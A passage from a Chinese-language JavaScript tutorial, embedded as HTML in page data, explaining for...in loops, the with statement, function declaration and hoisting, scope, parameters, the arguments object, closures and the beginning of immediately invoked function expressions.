没有任何输出</code></pre><p>上面代码中，对象<code>obj</code>继承了<code>toString</code>属性，该属性不会被<code>for...in</code>循环遍历到，因为它默认是“不可遍历”的。关于对象属性的可遍历性，参见《标准库》章节中 Object 一章的介绍。</p>\n<p>如果继承的属性是可遍历的，那么就会被<code>for...in</code>循环遍历到。但是，一般情况下，都是只想遍历对象自身的属性，所以使用<code>for...in</code>的时候，应该结合使用<code>hasOwnProperty</code>方法，在循环内部判断一下，某个属性是否为对象自身的属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var person = { name: &#039;老张&#039; };\n\nfor (var key in person) {\n  if (person.hasOwnProperty(key)) {\n    console.log(key);\n  }\n}\n// name</code></pre>\n        <h2>\n            <a href='#with-语句' class='header-anchor'>#</a>\n            <span>with 语句</span>\n        </h2>\n    <p><code>with</code>语句的格式如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>with (对象) {\n  语句;\n}</code></pre><p>它的作用是操作同一个对象的多个属性时，提供一些书写的方便。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 例一\nvar obj = {\n  p1: 1,\n  p2: 2,\n};\nwith (obj) {\n  p1 = 4;\n  p2 = 5;\n}\n// 等同于\nobj.p1 = 4;\nobj.p2 = 5;\n\n// 例二\nwith (document.links[0]){\n  console.log(href);\n  console.log(title);\n  console.log(style);\n}\n// 等同于\nconsole.log(document.links[0].href);\nconsole.log(document.links[0].title);\nconsole.log(document.links[0].style);</code></pre><p>注意，如果<code>with</code>区块内部有变量的赋值操作，必须是当前对象已经存在的属性，否则会创造一个当前作用域的全局变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nwith (obj) {\n  p1 = 4;\n  p2 = 5;\n}\n\nobj.p1 // undefined\np1 // 4</code></pre><p>上面代码中，对象<code>obj</code>并没有<code>p1</code>属性，对<code>p1</code>赋值等于创造了一个全局变量<code>p1</code>。正确的写法应该是，先定义对象<code>obj</code>的属性<code>p1</code>，然后在<code>with</code>区块内操作它。</p>\n<p>这是因为<code>with</code>区块没有改变作用域，它的内部依然是当前作用域。这造成了<code>with</code>语句的一个很大的弊病，就是绑定对象不明确。</p>\n<pre class=\"prettyprint language-javascript\"><code>with (obj) {\n  console.log(x);\n}</code></pre><p>单纯从上面的代码块，根本无法判断<code>x</code>到底是全局变量，还是对象<code>obj</code>的一个属性。这非常不利于代码的除错和模块化，编译器也无法对这段代码进行优化，只能留到运行时判断，这就拖慢了运行速度。因此，建议不要使用<code>with</code>语句，可以考虑用一个临时变量代替<code>with</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>with(obj1.obj2.obj3) {\n  console.log(p1 + p2);\n}\n\n// 可以写成\nvar temp = obj1.obj2.obj3;\nconsole.log(temp.p1 + temp.p2);</code></pre>\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Dr. Axel Rauschmayer，<a href=\"http://www.2ality.com/2012/10/javascript-properties.html\">Object properties in JavaScript</a></li>\n<li>Lakshan Perera, <a href=\"http://www.laktek.com/2012/12/29/revisiting-javascript-objects/\">Revisiting JavaScript Objects</a></li>\n<li>Angus Croll, <a href=\"http://javascriptweblog.wordpress.com/2010/09/27/the-secret-life-of-javascript-primitives/\">The Secret Life of JavaScript Primitives</a>i</li>\n<li>Dr. Axel Rauschmayer, <a href=\"http://www.2ality.com/2011/06/with-statement.html\">JavaScript’s with statement and why it’s deprecated</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"数据类型","link":"javascript:void(0)"},{"title":"函数","link":"/types/function.html"}],"content":"\n        <h1>\n            <a href='#函数' class='header-anchor'>#</a>\n            <span>函数</span>\n        </h1>\n    <p>函数是一段可以反复调用的代码块。函数还能接受输入的参数，不同的参数会返回不同的值。</p>\n\n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    \n        <h3>\n            <a href='#函数的声明' class='header-anchor'>#</a>\n            <span>函数的声明</span>\n        </h3>\n    <p>JavaScript 有三种声明函数的方法。</p>\n<p><strong>（1）function 命令</strong></p>\n<p><code>function</code>命令声明的代码区块，就是一个函数。<code>function</code>命令后面是函数名，函数名后面是一对圆括号，里面是传入函数的参数。函数体放在大括号里面。</p>\n<pre class=\"prettyprint language-javascript\"><code>function print(s) {\n  console.log(s);\n}</code></pre><p>上面的代码命名了一个<code>print</code>函数，以后使用<code>print()</code>这种形式，就可以调用相应的代码。这叫做函数的声明（Function Declaration）。</p>\n<p><strong>（2）函数表达式</strong></p>\n<p>除了用<code>function</code>命令声明函数，还可以采用变量赋值的写法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var print = function(s) {\n  console.log(s);\n};</code></pre><p>这种写法将一个匿名函数赋值给变量。这时，这个匿名函数又称函数表达式（Function Expression），因为赋值语句的等号右侧只能放表达式。</p>\n<p>采用函数表达式声明函数时，<code>function</code>命令后面不带有函数名。如果加上函数名，该函数名只在函数体内部有效，在函数体外部无效。</p>\n<pre class=\"prettyprint language-javascript\"><code>var print = function x(){\n  console.log(typeof x);\n};\n\nx\n// ReferenceError: x is not defined\n\nprint()\n// function</code></pre><p>上面代码在函数表达式中，加入了函数名<code>x</code>。这个<code>x</code>只在函数体内部可用，指代函数表达式本身，其他地方都不可用。这种写法的用处有两个，一是可以在函数体内部调用自身，二是方便除错（除错工具显示函数调用栈时，将显示函数名，而不再显示这里是一个匿名函数）。因此，下面的形式声明函数也非常常见。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function f() {};</code></pre><p>需要注意的是，函数的表达式需要在语句的结尾加上分号，表示语句结束。而函数的声明在结尾的大括号后面不用加分号。总的来说，这两种声明函数的方式，差别很细微，可以近似认为是等价的。</p>\n<p><strong>（3）Function 构造函数</strong></p>\n<p>第三种声明函数的方式是<code>Function</code>构造函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var add = new Function(\n  &#039;x&#039;,\n  &#039;y&#039;,\n  &#039;return x + y&#039;\n);\n\n// 等同于\nfunction add(x, y) {\n  return x + y;\n}</code></pre><p>上面代码中，<code>Function</code>构造函数接受三个参数，除了最后一个参数是<code>add</code>函数的“函数体”，其他参数都是<code>add</code>函数的参数。</p>\n<p>你可以传递任意数量的参数给<code>Function</code>构造函数，只有最后一个参数会被当做函数体，如果只有一个参数，该参数就是函数体。</p>\n<pre class=\"prettyprint language-javascript\"><code>var foo = new Function(\n  &#039;return &quot;hello world&quot;&#039;\n);\n\n// 等同于\nfunction foo() {\n  return &#039;hello world&#039;;\n}</code></pre><p><code>Function</code>构造函数可以不使用<code>new</code>命令，返回结果完全一样。</p>\n<p>总的来说，这种声明函数的方式非常不直观，几乎无人使用。</p>\n\n        <h3>\n            <a href='#函数的重复声明' class='header-anchor'>#</a>\n            <span>函数的重复声明</span>\n        </h3>\n    <p>如果同一个函数被多次声明，后面的声明就会覆盖前面的声明。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n  console.log(1);\n}\nf() // 2\n\nfunction f() {\n  console.log(2);\n}\nf() // 2</code></pre><p>上面代码中，后一次的函数声明覆盖了前面一次。而且，由于函数名的提升（参见下文），前一次声明在任何时候都是无效的，这一点要特别注意。</p>\n\n        <h3>\n            <a href='#圆括号运算符，return-语句和递归' class='header-anchor'>#</a>\n            <span>圆括号运算符，return 语句和递归</span>\n        </h3>\n    <p>调用函数时，要使用圆括号运算符。圆括号之中，可以加入函数的参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function add(x, y) {\n  return x + y;\n}\n\nadd(1, 1) // 2</code></pre><p>上面代码中，函数名后面紧跟一对圆括号，就会调用这个函数。</p>\n<p>函数体内部的<code>return</code>语句，表示返回。JavaScript 引擎遇到<code>return</code>语句，就直接返回<code>return</code>后面的那个表达式的值，后面即使还有语句，也不会得到执行。也就是说，<code>return</code>语句所带的那个表达式，就是函数的返回值。<code>return</code>语句不是必需的，如果没有的话，该函数就不返回任何值，或者说返回<code>undefined</code>。</p>\n<p>函数可以调用自身，这就是递归（recursion）。下面就是通过递归，计算斐波那契数列的代码。</p>\n<pre class=\"prettyprint language-javascript\"><code>function fib(num) {\n  if (num === 0) return 0;\n  if (num === 1) return 1;\n  return fib(num - 2) + fib(num - 1);\n}\n\nfib(6) // 8</code></pre><p>上面代码中，<code>fib</code>函数内部又调用了<code>fib</code>，计算得到斐波那契数列的第6个元素是8。</p>\n\n        <h3>\n            <a href='#第一等公民' class='header-anchor'>#</a>\n            <span>第一等公民</span>\n        </h3>\n    <p>JavaScript 语言将函数看作一种值，与其它值（数值、字符串、布尔值等等）地位相同。凡是可以使用值的地方，就能使用函数。比如，可以把函数赋值给变量和对象的属性，也可以当作参数传入其他函数，或者作为函数的结果返回。函数只是一个可以执行的值，此外并无特殊之处。</p>\n<p>由于函数与其他数据类型地位平等，所以在 JavaScript 语言中又称函数为第一等公民。</p>\n<pre class=\"prettyprint language-javascript\"><code>function add(x, y) {\n  return x + y;\n}\n\n// 将函数赋值给一个变量\nvar operator = add;\n\n// 将函数作为参数和返回值\nfunction a(op){\n  return op;\n}\na(add)(1, 1)\n// 2</code></pre>\n        <h3>\n            <a href='#函数名的提升' class='header-anchor'>#</a>\n            <span>函数名的提升</span>\n        </h3>\n    <p>JavaScript 引擎将函数名视同变量名，所以采用<code>function</code>命令声明函数时，整个函数会像变量声明一样，被提升到代码头部。所以，下面的代码不会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>f();\n\nfunction f() {}</code></pre><p>表面上，上面代码好像在声明之前就调用了函数<code>f</code>。但是实际上，由于“变量提升”，函数<code>f</code>被提升到了代码头部，也就是在调用之前已经声明了。但是，如果采用赋值语句定义函数，JavaScript 就会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>f();\nvar f = function (){};\n// TypeError: undefined is not a function</code></pre><p>上面的代码等同于下面的形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f;\nf();\nf = function () {};</code></pre><p>上面代码第二行，调用<code>f</code>的时候，<code>f</code>只是被声明了，还没有被赋值，等于<code>undefined</code>，所以会报错。因此，如果同时采用<code>function</code>命令和赋值语句声明同一个函数，最后总是采用赋值语句的定义。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function () {\n  console.log(&#039;1&#039;);\n}\n\nfunction f() {\n  console.log(&#039;2&#039;);\n}\n\nf() // 1</code></pre>\n        <h2>\n            <a href='#函数的属性和方法' class='header-anchor'>#</a>\n            <span>函数的属性和方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#name-属性' class='header-anchor'>#</a>\n            <span>name 属性</span>\n        </h3>\n    <p>函数的<code>name</code>属性返回函数的名字。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f1() {}\nf1.name // &quot;f1&quot;</code></pre><p>如果是通过变量赋值定义的函数，那么<code>name</code>属性返回变量名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f2 = function () {};\nf2.name // &quot;f2&quot;</code></pre><p>但是，上面这种情况，只有在变量的值是一个匿名函数时才是如此。如果变量的值是一个具名函数，那么<code>name</code>属性返回<code>function</code>关键字之后的那个函数名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f3 = function myName() {};\nf3.name // &#039;myName&#039;</code></pre><p>上面代码中，<code>f3.name</code>返回函数表达式的名字。注意，真正的函数名还是<code>f3</code>，而<code>myName</code>这个名字只在函数体内部可用。</p>\n<p><code>name</code>属性的一个用处，就是获取参数函数的名字。</p>\n<pre class=\"prettyprint language-javascript\"><code>var myFunc = function () {};\n\nfunction test(f) {\n  console.log(f.name);\n}\n\ntest(myFunc) // myFunc</code></pre><p>上面代码中，函数<code>test</code>内部通过<code>name</code>属性，就可以知道传入的参数是什么函数。</p>\n\n        <h3>\n            <a href='#length-属性' class='header-anchor'>#</a>\n            <span>length 属性</span>\n        </h3>\n    <p>函数的<code>length</code>属性返回函数预期传入的参数个数，即函数定义之中的参数个数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(a, b) {}\nf.length // 2</code></pre><p>上面代码定义了空函数<code>f</code>，它的<code>length</code>属性就是定义时的参数个数。不管调用时输入了多少个参数，<code>length</code>属性始终等于2。</p>\n<p><code>length</code>属性提供了一种机制，判断定义时和调用时参数的差异，以便实现面向对象编程的”方法重载“（overload）。</p>\n\n        <h3>\n            <a href='#toString()' class='header-anchor'>#</a>\n            <span>toString()</span>\n        </h3>\n    <p>函数的<code>toString</code>方法返回一个字符串，内容是函数的源码。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n  a();\n  b();\n  c();\n}\n\nf.toString()\n// function f() {\n//  a();\n//  b();\n//  c();\n// }</code></pre><p>函数内部的注释也可以返回。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {/*\n  这是一个\n  多行注释\n*/}\n\nf.toString()\n// &quot;function f(){/*\n//   这是一个\n//   多行注释\n// */}&quot;</code></pre><p>利用这一点，可以变相实现多行字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var multiline = function (fn) {\n  var arr = fn.toString().split(&#039;\\n&#039;);\n  return arr.slice(1, arr.length - 1).join(&#039;\\n&#039;);\n};\n\nfunction f() {/*\n  这是一个\n  多行注释\n*/}\n\nmultiline(f);\n// &quot; 这是一个\n//   多行注释&quot;</code></pre>\n        <h2>\n            <a href='#函数作用域' class='header-anchor'>#</a>\n            <span>函数作用域</span>\n        </h2>\n    \n        <h3>\n            <a href='#定义' class='header-anchor'>#</a>\n            <span>定义</span>\n        </h3>\n    <p>作用域（scope）指的是变量存在的范围。在 ES5 的规范中，Javascript 只有两种作用域：一种是全局作用域，变量在整个程序中一直存在，所有地方都可以读取；另一种是函数作用域，变量只在函数内部存在。ES6 又新增了块级作用域，本教程不涉及。</p>\n<p>函数外部声明的变量就是全局变量（global variable），它可以在函数内部读取。</p>\n<pre class=\"prettyprint language-javascript\"><code>var v = 1;\n\nfunction f() {\n  console.log(v);\n}\n\nf()\n// 1</code></pre><p>上面的代码表明，函数<code>f</code>内部可以读取全局变量<code>v</code>。</p>\n<p>在函数内部定义的变量，外部无法读取，称为“局部变量”（local variable）。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(){\n  var v = 1;\n}\n\nv // ReferenceError: v is not defined</code></pre><p>上面代码中，变量<code>v</code>在函数内部定义，所以是一个局部变量，函数之外就无法读取。</p>\n<p>函数内部定义的变量，会在该作用域内覆盖同名全局变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var v = 1;\n\nfunction f(){\n  var v = 2;\n  console.log(v);\n}\n\nf() // 2\nv // 1</code></pre><p>上面代码中，变量<code>v</code>同时在函数的外部和内部有定义。结果，在函数内部定义，局部变量<code>v</code>覆盖了全局变量<code>v</code>。</p>\n<p>注意，对于<code>var</code>命令来说，局部变量只能在函数内部声明，在其他区块中声明，一律都是全局变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (true) {\n  var x = 5;\n}\nconsole.log(x);  // 5</code></pre><p>上面代码中，变量<code>x</code>在条件判断区块之中声明，结果就是一个全局变量，可以在区块之外读取。</p>\n\n        <h3>\n            <a href='#函数内部的变量提升' class='header-anchor'>#</a>\n            <span>函数内部的变量提升</span>\n        </h3>\n    <p>与全局作用域一样，函数作用域内部也会产生“变量提升”现象。<code>var</code>命令声明的变量，不管在什么位置，变量声明都会被提升到函数体的头部。</p>\n<pre class=\"prettyprint language-javascript\"><code>function foo(x) {\n  if (x &gt; 100) {\n    var tmp = x - 100;\n  }\n}\n\n// 等同于\nfunction foo(x) {\n  var tmp;\n  if (x &gt; 100) {\n    tmp = x - 100;\n  };\n}</code></pre>\n        <h3>\n            <a href='#函数本身的作用域' class='header-anchor'>#</a>\n            <span>函数本身的作用域</span>\n        </h3>\n    <p>函数本身也是一个值，也有自己的作用域。它的作用域与变量一样，就是其声明时所在的作用域，与其运行时所在的作用域无关。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1;\nvar x = function () {\n  console.log(a);\n};\n\nfunction f() {\n  var a = 2;\n  x();\n}\n\nf() // 1</code></pre><p>上面代码中，函数<code>x</code>是在函数<code>f</code>的外部声明的，所以它的作用域绑定外层，内部变量<code>a</code>不会到函数<code>f</code>体内取值，所以输出<code>1</code>，而不是<code>2</code>。</p>\n<p>总之，函数执行时所在的作用域，是定义时的作用域，而不是调用时所在的作用域。</p>\n<p>很容易犯错的一点是，如果函数<code>A</code>调用函数<code>B</code>，却没考虑到函数<code>B</code>不会引用函数<code>A</code>的内部变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = function () {\n  console.log(a);\n};\n\nfunction y(f) {\n  var a = 2;\n  f();\n}\n\ny(x)\n// ReferenceError: a is not defined</code></pre><p>上面代码将函数<code>x</code>作为参数，传入函数<code>y</code>。但是，函数<code>x</code>是在函数<code>y</code>体外声明的，作用域绑定外层，因此找不到函数<code>y</code>的内部变量<code>a</code>，导致报错。</p>\n<p>同样的，函数体内部声明的函数，作用域绑定函数体内部。</p>\n<pre class=\"prettyprint language-javascript\"><code>function foo() {\n  var x = 1;\n  function bar() {\n    console.log(x);\n  }\n  return bar;\n}\n\nvar x = 2;\nvar f = foo();\nf() // 1</code></pre><p>上面代码中，函数<code>foo</code>内部声明了一个函数<code>bar</code>，<code>bar</code>的作用域绑定<code>foo</code>。当我们在<code>foo</code>外部取出<code>bar</code>执行时，变量<code>x</code>指向的是<code>foo</code>内部的<code>x</code>，而不是<code>foo</code>外部的<code>x</code>。正是这种机制，构成了下文要讲解的“闭包”现象。</p>\n\n        <h2>\n            <a href='#参数' class='header-anchor'>#</a>\n            <span>参数</span>\n        </h2>\n    \n        <h3>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h3>\n    <p>函数运行的时候，有时需要提供外部数据，不同的外部数据会得到不同的结果，这种外部数据就叫参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function square(x) {\n  return x * x;\n}\n\nsquare(2) // 4\nsquare(3) // 9</code></pre><p>上式的<code>x</code>就是<code>square</code>函数的参数。每次运行的时候，需要提供这个值，否则得不到结果。</p>\n\n        <h3>\n            <a href='#参数的省略' class='header-anchor'>#</a>\n            <span>参数的省略</span>\n        </h3>\n    <p>函数参数不是必需的，Javascript 允许省略参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(a, b) {\n  return a;\n}\n\nf(1, 2, 3) // 1\nf(1) // 1\nf() // undefined\n\nf.length // 2</code></pre><p>上面代码的函数<code>f</code>定义了两个参数，但是运行时无论提供多少个参数（或者不提供参数），JavaScript 都不会报错。省略的参数的值就变为<code>undefined</code>。需要注意的是，函数的<code>length</code>属性与实际传入的参数个数无关，只反映函数预期传入的参数个数。</p>\n<p>但是，没有办法只省略靠前的参数，而保留靠后的参数。如果一定要省略靠前的参数，只有显式传入<code>undefined</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(a, b) {\n  return a;\n}\n\nf( , 1) // SyntaxError: Unexpected token ,(…)\nf(undefined, 1) // undefined</code></pre><p>上面代码中，如果省略第一个参数，就会报错。</p>\n\n        <h3>\n            <a href='#传递方式' class='header-anchor'>#</a>\n            <span>传递方式</span>\n        </h3>\n    <p>函数参数如果是原始类型的值（数值、字符串、布尔值），传递方式是传值传递（passes by value）。这意味着，在函数体内修改参数值，不会影响到函数外部。</p>\n<pre class=\"prettyprint language-javascript\"><code>var p = 2;\n\nfunction f(p) {\n  p = 3;\n}\nf(p);\n\np // 2</code></pre><p>上面代码中，变量<code>p</code>是一个原始类型的值，传入函数<code>f</code>的方式是传值传递。因此，在函数内部，<code>p</code>的值是原始值的拷贝，无论怎么修改，都不会影响到原始值。</p>\n<p>但是，如果函数参数是复合类型的值（数组、对象、其他函数），传递方式是传址传递（pass by reference）。也就是说，传入函数的原始值的地址，因此在函数内部修改参数，将会影响到原始值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: 1 };\n\nfunction f(o) {\n  o.p = 2;\n}\nf(obj);\n\nobj.p // 2</code></pre><p>上面代码中，传入函数<code>f</code>的是参数对象<code>obj</code>的地址。因此，在函数内部修改<code>obj</code>的属性<code>p</code>，会影响到原始值。</p>\n<p>注意，如果函数内部修改的，不是参数对象的某个属性，而是替换掉整个参数，这时不会影响到原始值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = [1, 2, 3];\n\nfunction f(o) {\n  o = [2, 3, 4];\n}\nf(obj);\n\nobj // [1, 2, 3]</code></pre><p>上面代码中，在函数<code>f</code>内部，参数对象<code>obj</code>被整个替换成另一个值。这时不会影响到原始值。这是因为，形式参数（<code>o</code>）的值实际是参数<code>obj</code>的地址，重新对<code>o</code>赋值导致<code>o</code>指向另一个地址，保存在原地址上的值当然不受影响。</p>\n\n        <h3>\n            <a href='#同名参数' class='header-anchor'>#</a>\n            <span>同名参数</span>\n        </h3>\n    <p>如果有同名的参数，则取最后出现的那个值。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(a, a) {\n  console.log(a);\n}\n\nf(1, 2) // 2</code></pre><p>上面代码中，函数<code>f</code>有两个参数，且参数名都是<code>a</code>。取值的时候，以后面的<code>a</code>为准，即使后面的<code>a</code>没有值或被省略，也是以其为准。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(a, a) {\n  console.log(a);\n}\n\nf(1) // undefined</code></pre><p>调用函数<code>f</code>的时候，没有提供第二个参数，<code>a</code>的取值就变成了<code>undefined</code>。这时，如果要获得第一个<code>a</code>的值，可以使用<code>arguments</code>对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(a, a) {\n  console.log(arguments[0]);\n}\n\nf(1) // 1</code></pre>\n        <h3>\n            <a href='#arguments-对象' class='header-anchor'>#</a>\n            <span>arguments 对象</span>\n        </h3>\n    <p><strong>（1）定义</strong></p>\n<p>由于 JavaScript 允许函数有不定数目的参数，所以需要一种机制，可以在函数体内部读取所有参数。这就是<code>arguments</code>对象的由来。</p>\n<p><code>arguments</code>对象包含了函数运行时的所有参数，<code>arguments[0]</code>就是第一个参数，<code>arguments[1]</code>就是第二个参数，以此类推。这个对象只有在函数体内部，才可以使用。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function (one) {\n  console.log(arguments[0]);\n  console.log(arguments[1]);\n  console.log(arguments[2]);\n}\n\nf(1, 2, 3)\n// 1\n// 2\n// 3</code></pre><p>正常模式下，<code>arguments</code>对象可以在运行时修改。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function(a, b) {\n  arguments[0] = 3;\n  arguments[1] = 2;\n  return a + b;\n}\n\nf(1, 1) // 5</code></pre><p>上面代码中，函数<code>f</code>调用时传入的参数，在函数内部被修改成<code>3</code>和<code>2</code>。</p>\n<p>严格模式下，<code>arguments</code>对象是一个只读对象，修改它是无效的，但不会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function(a, b) {\n  &#039;use strict&#039;; // 开启严格模式\n  arguments[0] = 3; // 无效\n  arguments[1] = 2; // 无效\n  return a + b;\n}\n\nf(1, 1) // 2</code></pre><p>上面代码中，函数体内是严格模式，这时修改<code>arguments</code>对象就是无效的。</p>\n<p>通过<code>arguments</code>对象的<code>length</code>属性，可以判断函数调用时到底带几个参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n  return arguments.length;\n}\n\nf(1, 2, 3) // 3\nf(1) // 1\nf() // 0</code></pre><p><strong>（2）与数组的关系</strong></p>\n<p>需要注意的是，虽然<code>arguments</code>很像数组，但它是一个对象。数组专有的方法（比如<code>slice</code>和<code>forEach</code>），不能在<code>arguments</code>对象上直接使用。</p>\n<p>如果要让<code>arguments</code>对象使用数组方法，真正的解决方法是将<code>arguments</code>转为真正的数组。下面是两种常用的转换方法：<code>slice</code>方法和逐一填入新数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var args = Array.prototype.slice.call(arguments);\n\n// 或者\nvar args = [];\nfor (var i = 0; i &lt; arguments.length; i++) {\n  args.push(arguments[i]);\n}</code></pre><p><strong>（3）callee 属性</strong></p>\n<p><code>arguments</code>对象带有一个<code>callee</code>属性，返回它所对应的原函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function () {\n  console.log(arguments.callee === f);\n}\n\nf() // true</code></pre><p>可以通过<code>arguments.callee</code>，达到调用函数自身的目的。这个属性在严格模式里面是禁用的，因此不建议使用。</p>\n\n        <h2>\n            <a href='#函数的其他知识点' class='header-anchor'>#</a>\n            <span>函数的其他知识点</span>\n        </h2>\n    \n        <h3>\n            <a href='#闭包' class='header-anchor'>#</a>\n            <span>闭包</span>\n        </h3>\n    <p>闭包（closure）是 Javascript 语言的一个难点，也是它的特色，很多高级应用都要依靠闭包实现。</p>\n<p>理解闭包，首先必须理解变量作用域。前面提到，JavaScript 有两种作用域：全局作用域和函数作用域。函数内部可以直接读取全局变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var n = 999;\n\nfunction f1() {\n  console.log(n);\n}\nf1() // 999</code></pre><p>上面代码中，函数<code>f1</code>可以读取全局变量<code>n</code>。</p>\n<p>但是，函数外部无法读取函数内部声明的变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f1() {\n  var n = 999;\n}\n\nconsole.log(n)\n// Uncaught ReferenceError: n is not defined(</code></pre><p>上面代码中，函数<code>f1</code>内部声明的变量<code>n</code>，函数外是无法读取的。</p>\n<p>如果出于种种原因，需要得到函数内的局部变量。正常情况下，这是办不到的，只有通过变通方法才能实现。那就是在函数的内部，再定义一个函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f1() {\n  var n = 999;\n  function f2() {\n　　console.log(n); // 999\n  }\n}</code></pre><p>上面代码中，函数<code>f2</code>就在函数<code>f1</code>内部，这时<code>f1</code>内部的所有局部变量，对<code>f2</code>都是可见的。但是反过来就不行，<code>f2</code>内部的局部变量，对<code>f1</code>就是不可见的。这就是 JavaScript 语言特有的&quot;链式作用域&quot;结构（chain scope），子对象会一级一级地向上寻找所有父对象的变量。所以，父对象的所有变量，对子对象都是可见的，反之则不成立。</p>\n<p>既然<code>f2</code>可以读取<code>f1</code>的局部变量，那么只要把<code>f2</code>作为返回值，我们不就可以在<code>f1</code>外部读取它的内部变量了吗！</p>\n<pre class=\"prettyprint language-javascript\"><code>function f1() {\n  var n = 999;\n  function f2() {\n    console.log(n);\n  }\n  return f2;\n}\n\nvar result = f1();\nresult(); // 999</code></pre><p>上面代码中，函数<code>f1</code>的返回值就是函数<code>f2</code>，由于<code>f2</code>可以读取<code>f1</code>的内部变量，所以就可以在外部获得<code>f1</code>的内部变量了。</p>\n<p>闭包就是函数<code>f2</code>，即能够读取其他函数内部变量的函数。由于在 JavaScript 语言中，只有函数内部的子函数才能读取内部变量，因此可以把闭包简单理解成“定义在一个函数内部的函数”。闭包最大的特点，就是它可以“记住”诞生的环境，比如<code>f2</code>记住了它诞生的环境<code>f1</code>，所以从<code>f2</code>可以得到<code>f1</code>的内部变量。在本质上，闭包就是将函数内部和函数外部连接起来的一座桥梁。</p>\n<p>闭包的最大用处有两个，一个是可以读取函数内部的变量，另一个就是让这些变量始终保持在内存中，即闭包可以使得它诞生环境一直存在。请看下面的例子，闭包使得内部变量记住上一次调用时的运算结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>function createIncrementor(start) {\n  return function () {\n    return start++;\n  };\n}\n\nvar inc = createIncrementor(5);\n\ninc() // 5\ninc() // 6\ninc() // 7</code></pre><p>上面代码中，<code>start</code>是函数<code>createIncrementor</code>的内部变量。通过闭包，<code>start</code>的状态被保留了，每一次调用都是在上一次调用的基础上进行计算。从中可以看到，闭包<code>inc</code>使得函数<code>createIncrementor</code>的内部环境，一直存在。所以，闭包可以看作是函数内部作用域的一个接口。</p>\n<p>为什么会这样呢？原因就在于<code>inc</code>始终在内存中，而<code>inc</code>的存在依赖于<code>createIncrementor</code>，因此也始终在内存中，不会在调用结束后，被垃圾回收机制回收。</p>\n<p>闭包的另一个用处，是封装对象的私有属性和私有方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>function Person(name) {\n  var _age;\n  function setAge(n) {\n    _age = n;\n  }\n  function getAge() {\n    return _age;\n  }\n\n  return {\n    name: name,\n    getAge: getAge,\n    setAge: setAge\n  };\n}\n\nvar p1 = Person(&#039;张三&#039;);\np1.setAge(25);\np1.getAge() // 25</code></pre><p>上面代码中，函数<code>Person</code>的内部变量<code>_age</code>，通过闭包<code>getAge</code>和<code>setAge</code>，变成了返回对象<code>p1</code>的私有变量。</p>\n<p>注意，外层函数每次运行，都会生成一个新的闭包，而这个闭包又会保留外层函数的内部变量，所以内存消耗很大。因此不能滥用闭包，否则会造成网页的性能问题。</p>\n\n        <h3>\n            <a href='#立即调用的函数表达式（IIFE）' class='header-anchor'>#</a>\n            <span>立即调用的函数表达式（IIFE）</span>\n        </h3>\n    <p>在 Javascript 中，圆括号<code>()</code>是一种运算符，跟在函数名之后，表示调用该函数。比如，<code>print()</code>就表示调用<code>print</code>函数。</p>\n<p>有时，我们需要在定义函数之后，立即调用该函数。这时，你不能在函数的定义之后加上圆括号，这会产生语法错误。</p>\n<pre class=\"prettyprint language-javascript\"><code>function(){ /* code */ }();\n// SyntaxError: Unexpected token (</code></pre><p>产生这个错误的原因是，<code>function</code>这个关键字即可以当作语句，也可以当作表达式。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 语句\nfunction f() {}\n\n// 表达式\nvar f = function f() {}</code></pre><p>为了避免解析上的歧义，JavaScript 引擎规定，如果<code>function</code>关键字出现在行首，一律解释成语句。因此，JavaScript引擎看到行首是<code>function</code>关键字之后，认为这一段都是函数的定义，不应该以圆括号结尾，所以就报错了。</p>\n<p>解决方法就是不要让<code>function</code>出现在行首，让引擎将其理解成一个表达式。最简单的处理，就是将其放在一个圆括号里面。</p>\n<pre 